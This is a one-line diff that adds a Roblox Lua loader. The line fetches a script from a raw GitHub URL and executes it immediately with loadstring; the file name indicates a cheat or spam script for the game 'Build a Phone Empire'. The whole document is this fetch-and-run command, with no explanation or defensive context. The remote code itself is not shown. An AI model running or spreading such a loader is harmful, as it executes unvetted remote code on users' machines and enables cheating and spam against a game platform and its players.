@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/build-a-phone-empire-spam2-vi9tdmcol6o5mj.lua"))()
